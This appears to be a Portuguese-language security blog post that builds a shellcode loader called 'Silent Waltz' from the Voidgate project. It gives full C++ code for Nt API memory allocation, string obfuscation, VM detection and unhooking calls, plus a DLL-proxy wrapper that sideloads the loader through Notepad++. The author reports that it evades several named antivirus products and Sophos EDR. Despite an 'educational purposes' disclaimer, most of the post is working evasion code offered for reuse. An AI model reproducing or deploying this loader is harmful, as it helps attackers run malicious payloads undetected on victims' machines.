---
weight: 5
title: "Post V: Criando-carregador"
date: 2024-09-13T15:58:26+08:00
lastmod: 2024-09-13T15:58:26+08:00
draft: false
author: Vith0r
authorLink: https://github.com/Vith0r
description: Reverse Shell Simples.
images: 
resources:
  - name: featured-image
    src: Image.jpeg
tags:
  - Malware
categories:
  - Malware
lightgallery: true
toc:
  auto: false
---

Bom, no post de hoje vou mostrar um carregador simples que fiz para conseguir contornar alguns antivírus bastante utilizados hoje em dia.

## Obfusheader

Vou estar utilizando o projeto [Obfusheader](https://github.com/ac3ss0r/obfusheader.h) para conseguir esconder strings. É um projeto fácil de utilizar.

![](https://telegra.ph/file/7d46c99226b990aa9a9e2.png)


## Voidgate

> [!warning] Warning
> As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra coisa são estritamente para fins educacionais.

[Voidgate](https://github.com/vxCrypt0r/Voidgate/) vai ser modificado e usado para executar nossa payload [Voidgate](https://github.com/vxCrypt0r/Voidgate/) é um projeto que utiliza uma técnica que pode ser usada para `contornar scanners de memoria de AV/EDR`. ele pode ser usado para esconder shellcodes bem conhecidos e detectados `como as do msfvenom` executando `on-the-fly decryption of individual encrypted assembly instructions`, tornando assim os scanners de memória inúteis para aquela página de memória específica.

---
### Como funciona:
Esta técnica criará uma região de memória `PAGE_EXECUTE_READWRITE` onde as instruções de montagem criptografadas serão armazenadas. O shellcode será encapsulado em algum preenchimento. O programa definirá um `Hardware Breakpoint` (HWBP) no ponto de entrada do shellcode.
Em seguida, o programa instalará um `Vectored Exception Handler` (VEH). Este VEH basicamente agirá como um `depurador`, percorrendo o código passo a passo, lendo o registro de ponteiro de instrução (RIP) para cada exceção `SINGLE STEP` recebida pelo VEH e descriptografando os próximos 16 bytes (comprimento máximo de instrução de montagem x64) onde o RIP aponta. O VEH também criptografa de volta a instrução descriptografada anteriormente, garantindo que o restante do shellcode permaneça sempre criptografado, com exceção da única instrução de montagem atualmente em execução. Depois disso, ele continuará a execução, com o `TRAP FLAG` configurado no registro Eflags. Isso garantirá que a próxima instrução de montagem também acione uma exceção de ponto de interrupção que o VEH pode manipular.
Após a instalação do VEH, a execução do `thread principal` será redirecionada para o `payload entrypoint`. Quando o HWBP for acionado no entrypoint, o VEH parará em cada instrução de montagem executada, executará a descriptografia da próxima instrução de montagem e criptografará a instrução criptografada anterior, que é salva como uma variável global.
Ao fazer isso, basicamente `uma única instrução de montagem é descriptografada por vez`, com o restante do `payload permanecendo criptografado`.

### Limitações:

- NOTA: Esta técnica é ideal para obter um acesso `inicial` usando um shellcode `básico` como msfvenom ou shells revers personalizados. Isso também pode ser usado como uma carga útil inicial do estágio 1 que baixa o restante da carga útil do servidor C2.

- NOTA: Esta técnica não é compatível com todas as cargas úteis (como carregadores reflexivos). Abaixo está uma lista de limitações atuais:

1. Como o `VEH` será acionado para `EACH ASSEMBLY INSTRUCTION` executado no shellcode, a velocidade de execução do shellcode será drasticamente reduzida. Para cada instrução de montagem que a CPU executa, o VEH executará pelo menos 300 instruções ASM adicionais para executar a descriptografia, criptografia e restauração da execução para o thread principal. Se o shellcode fornecido for otimizado para tamanho menor em relação ao desempenho (como msfvenom), a execução da carga útil será mais lenta. Pode levar bastante tempo (dependendo da CPU) para executar um MSFVENOM. Isso acontece porque o shellcode específico usado pelo msfvenom está sacrificando o desempenho para obter um tamanho menor de payload.
2. Se o shellcode chamar `NtCreateThread` ou qualquer um de seus wrappers em Kernelbase.dll com o `entrypoint dentro do shellcode`, o payload `não funcionará`, pois o VEH não será acionado para essa execução de thread, pois não há `nenhum HWBP instalado no entrypoint do thread recém-criado`. (Trabalho em andamento - será implementado mais adiante neste repositório)
3. Se o shellcode tiver alguns `valores/variáveis ​​armazenados dentro de si` (por exemplo, tendo a string bruta "powershell.exe" que é referenciada por meio de um deslocamento em uma chamada para WinExec WINAPI) ou algum número `salvo em um deslocamento`, e o shellcode tentará carregá-lo ou referenciá-lo em algum lugar, o programa não funcionará, pois a variável ou string específica `será criptografada` e o VEH não a descriptografará.

---
### Voidgate

Bom, o projeto Voidgate já está sendo detectado pelo Windows Defender.

![](https://telegra.ph/file/9fe14647d3c21cf91bca0.png)

Então se dermos uma olhada rápida no código, logo saberemos uma coisa bem simples que podemos fazer para reviver o projeto e torná-lo menos detectável.

```cpp
#include "payload.h"
#include "Voidgate.h"

BYTE payload[] = { ...SHELLCODE... }; 
DWORD payload_size = sizeof(payload);

//XOR key for the encrypted payload
std::string key = "0dAd2!@BS1dtdCgPMWoA";

INT main()
{
    DWORD memory_size = SHELLCODE_PADDING + payload_size + SHELLCODE_PADDING;
    PVOID heap_memory = VirtualAlloc(NULL, memory_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!heap_memory)
    {
        LogWinapiError("VirtualAlloc");
        return EXIT_FAILURE;
    }
    payload_lower_bound = (DWORD64)heap_memory;
    payload_upper_bound = payload_lower_bound + memory_size;
	
    memset(heap_memory, '\x90', memory_size);
    PVOID payload_entry = (PBYTE)heap_memory + SHELLCODE_PADDING;
    memcpy(payload_entry, payload, payload_size);

    payload_base = (DWORD64)payload_entry;
    DWORD status = SetHardwareBreakpoint(payload_entry);
    PVOID veh = AddVectoredExceptionHandler(1, &VehDecryptHeapAsm);
    if (veh)
    {
        std::cout << "Executing the payload with VEH ASM decryption... This may take a while depending on the efficiency of the shellcode..." << std::endl;
        VoidGate vg = (VoidGate)payload_entry;
        vg();
    }

    //Cleanup
    VirtualFree(heap_memory, 0, MEM_RELEASE);
    return EXIT_SUCCESS;
}
```

Como podemos ver, o projeto utiliza APIs como `VirtualAlloc`, `memcpy`, `VirtualFree`. Então, podemos fazer o uso de APIs Nt. Para quem se esqueceu do que são, abaixo uma imagem para melhor entendimento:

![](https://telegra.ph/file/4d8fb25cc244a8274caaa.png)

## Detecção de máquinas virtuais

Bom, como eu sou um belo de um preguiçoso e não quero ficar sofrendo pensando em métodos de detecção de máquinas virtuais, vou utilizar o projeto [VMAware](https://github.com/kernelwernel/VMAware) que é uma biblioteca C++ multiplataforma para detecção de máquinas virtuais que apresenta mais de 100 técnicas exclusivas de detecção de VM para facilitar nossa vida.

Bom, o código do VoidGate vai ser modificado para utilizar APIs NT. Note que já vou estar utilizando o Obfusheader, e também lembrando que não vi necessidade de alterar nada no `Voidgate.cpp` e no `Voidgate.h` e sim o nome do loader será Silent Waltz, em referência a Kaito de HxH pq? também não sei.

```cpp
#include <Windows.h>
#include <iostream>
#include <string>
#include <psapi.h>
#include <ntstatus.h>

#include "payload.h"
#include "Voidgate.h"
#include "obfusheader.h"
#include "vmaware_check.hpp"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

// link: https://learn.microsoft.com/en-us/windows/console/console-screen-buffers#character-attributes
void SetConsoleColor(WORD color) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
}

// link: http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

// link: http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

// link: http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
    );

// link: http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

// link: http://undocumented.ntinternals.net/
typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(
    HANDLE ThreadHandle,
    THREAD_INFORMATION_CLASS ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength
    );

template<typename T>
T GetNtFunction(const char* funcName) {
	HMODULE ntdll = GetModuleHandleW(OBF(L"ntdll.dll"));
	if (!ntdll) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cerr << OBF("Failed to get handle to ntdll.dll") << std::endl;
		return nullptr;
	}
	return reinterpret_cast<T>(GetProcAddress(ntdll, funcName));
}

BYTE payload[] = { ...SHELLCODE... };
DWORD payload_size = sizeof(payload);

std::string key = OBF("0dAd2!@BS1dtdCgPMWoA");

void LogWinapiError(const char* functionName) {
	SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cerr << functionName << OBF(" failed with error code ") << GetLastError() << std::endl;
}

INT main() {
	SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
	std::cout << R"(
	_________.__.__                 __     __      __        .__   __          
	/   _____/|__|  |   ____   _____/  |_  /  \    /  \_____  |  |_/  |_________
	\_____  \ |  |  | _/ __ \ /    \   __\ \   \/\/   /\__  \ |  |\   __\___   /
	/        \|  |  |_\  ___/|   |  \  |    \        /  / __ \|  |_|  |  /    / 
	/_______  /|__|____/\___  >___|  /__|     \__/\  /  (____  /____/__| /_____ \
        \/              \/     \/              \/        \/                \/
    )" "\n\n" << std::endl;

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
	GetConsoleScreenBufferInfo(hConsole, &consoleInfo);
	WORD originalColor = consoleInfo.wAttributes;

	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	std::cout << OBF("[ Detecting virtual machines with VMAware ]\n");
	
	if (isRunningInVM()) {
	SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
	std::cout << OBF("[!] Virtual machine detected!") << "\n\n";
	//HANDLE hProcess = GetCurrentProcess();
	//TerminateProcess(hProcess, 1);
	}
	else {
	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	std::cout << OBF("[#] No virtual machine detected!") << "\n\n";
	}

	UnhookingK32(); UnhookingNT(); ETWPATCH();

    auto NtAllocateVirtualMemory = GetNtFunction<NtAllocateVirtualMemory_t>(OBF("NtAllocateVirtualMemory"));
    auto NtFreeVirtualMemory = GetNtFunction<NtFreeVirtualMemory_t>(OBF("NtFreeVirtualMemory"));
    auto NtWriteVirtualMemory = GetNtFunction<NtWriteVirtualMemory_t>(OBF("NtWriteVirtualMemory"));
    auto NtProtectVirtualMemory = GetNtFunction<NtProtectVirtualMemory_t>(OBF("NtProtectVirtualMemory"));
    auto NtSetInformationThread = GetNtFunction<NtSetInformationThread_t>(OBF("NtSetInformationThread"));

    if (!NtAllocateVirtualMemory || !NtFreeVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtSetInformationThread) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << OBF("Failed to resolve one or more NT Native API functions.") << std::endl;
        return EXIT_FAILURE;
    }

    DWORD memory_size = SHELLCODE_PADDING + payload_size + SHELLCODE_PADDING;

    PVOID heap_memory = nullptr;
    SIZE_T size = memory_size;
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &heap_memory, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << OBF("NtAllocateVirtualMemory failed with status: ") << status << std::endl;
        return EXIT_FAILURE;
    }

    payload_lower_bound = (DWORD64)heap_memory;
    payload_upper_bound = payload_lower_bound + memory_size;

    memset(heap_memory, '\x90', memory_size);
    PVOID payload_entry = (PBYTE)heap_memory + SHELLCODE_PADDING;
    SIZE_T written_size = payload_size;
    status = NtWriteVirtualMemory(GetCurrentProcess(), payload_entry, payload, payload_size, &written_size);
    if (!NT_SUCCESS(status)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << OBF("NtWriteVirtualMemory failed with status: ") << status << std::endl;
        return EXIT_FAILURE;
    }

    payload_base = (DWORD64)payload_entry;

    // Este passo não é modificado
    DWORD breakStatus = SetHardwareBreakpoint(payload_entry);

    // Instalar VEH para lidar com a descriptografia/encriptação do payload após cada instrução ASM executada pelo payload
    PVOID veh = AddVectoredExceptionHandler(1, &VehDecryptHeapAsm);
    if (veh) {
		SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << OBF("Executing the payload with VEH ASM decryption...\n") << std::endl;
        VoidGate vg = (VoidGate)payload_entry;
        vg();
    }

    SIZE_T free_size = memory_size;
    status = NtFreeVirtualMemory(GetCurrentProcess(), &heap_memory, &free_size, MEM_RELEASE);
    if (!NT_SUCCESS(status)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cerr << OBF("NtFreeVirtualMemory failed with status: ") << status << std::endl;
    }

    return EXIT_SUCCESS;
}
```

### vmaware_check.hpp e vmcheck.cpp

```
#pragma once
bool isRunningInVM();
```

```
#include "vmaware.hpp"

bool isRunningInVM() {
    return VM::detect();
}
```
## ETW Patch

Bom, não vou fornecer o código porque quero fazer um post focado apenas no ETW :)

## Kernel32 Unhooking

Vai ser praticamente o mesmo código que utilizei no post anterior.
## NtDll Unhooking

Bom, eu queria ter utilizado a técnica de `ReflectiveNtdll`, mas fiquei com preguiça, Então, apenas modifiquei o código feito no post anterior para, em vez de realizar o unhooking da `kernel32.dll`, realizar o unhooking da `ntdll.dll`.
## Pe-Sieve

Bom, não quis me aprofundar muito no código, pois se você viu os posts anteriores, já entende praticamente tudo o que estou fazendo. Mas de qualquer maneira, vamos realizar alguns testes nele. Primeiro vamos ver como ele se sai contra o [Pe-Sieve](https://github.com/hasherezade/pe-sieve):

![](https://telegra.ph/file/9576603eb0734df230c2b.gif)

## VirusTotal


![](https://telegra.ph/file/9a984d9ebce7301704269.gif)

Temos apenas 1 detecção no VirusTotal por conta do [VMAware](https://github.com/kernelwernel/VMAware/), Não vejo isso como um problema. Vamos seguir em frente.
## Contra antivírus

Fiz um teste do loader contra os seguintes antivírus: `Avast, MalwareBytes, McAfee, Kaspersky e BitDefender`. Dentre esses 5, apenas 1 detectou o loader, que foi o `BitDefender`.

<iframe width="760" height="515" src="https://www.youtube.com/embed/BOUuM60hIXI" frameborder="0" allowfullscreen></iframe>

## Contornando o BitDefender

Como o `BitDefender` acabou detectando o loader, vamos apenas modificar um pouco ele. Vamos transformá-lo em uma DLL e realizar uma técnica de DLL proxy no `Notepad++`, isso já foi abordado no meu post [Malware-Analysis-2](https://vith0r.github.io/posts/Malware-Analysis-2/). Abaixo está o que será necessário adicionar.

```cpp
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning(disable : 4996)

#pragma comment(linker, "/export:beNotified=original.beNotified,@1")
#pragma comment(linker, "/export:getFuncsArray=original.getFuncsArray,@2")
#pragma comment(linker, "/export:getName=original.getName,@3")
#pragma comment(linker, "/export:isUnicode=original.isUnicode,@4")
#pragma comment(linker, "/export:messageProc=original.messageProc,@5")
#pragma comment(linker, "/export:setInfo=original.setInfo,@6")
```

```cpp
DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    main();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);
        break;

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
```
## Resultado

Bom, como eu já esperava, não foi detectado e conseguimos também contornar com sucesso o `BitDefender`.

![](https://telegra.ph/file/08dcd21d5f28e63acde85.gif)

---
### VirusTotal
O resultado do loader em DLL contra o `VirusTotal` é baixo apenas 2 detecções. Caso quiséssemos torná-lo 100% indetectável, precisaríamos apenas fazer algumas pequenas modificações, nada que causaria dor de cabeça.

![](https://telegra.ph/file/d6d55cd067feab250a5af.gif)

## Sophos EDR
Conseguimos contornar também o [Sophos EDR](https://www.sophos.com/pt-br/products/endpoint-antivirus/edr) nos dois formatos Dll,EXE. Eu fiquei impressionado porque mais tarde tentei baixar o Python e não consegui, pois foi detectado como vírus. Depois tentei baixar o Discord e também foi detectado como vírus hahaha:

<iframe width="760" height="515" src="https://www.youtube.com/embed/OP-6RooHQ0o" frameborder="0" allowfullscreen></iframe>

## Conclusões

![](https://media0.giphy.com/media/14ceV8wMLIGO6Q/giphy.gif?cid=7941fdc6g8l53q9d6vojfo9v7edj9ldzp5p4qmmxjv2evzaa&ep=v1_gifs_search&rid=giphy.gif&ct=g)

Bom, conseguimos finalmente contornar um EDR e também alguns antivírus básicos e não ter uma taxa de detecção tão alta no VirusTotal. Obviamente, há muito espaço para melhorar o código. Mas tudo bem, meu intuito não é criar algo muito complexo, e sim apenas fazer um loader simples de entender e que no final funcione. Se você chegou até aqui, obrigado e tchau tchau.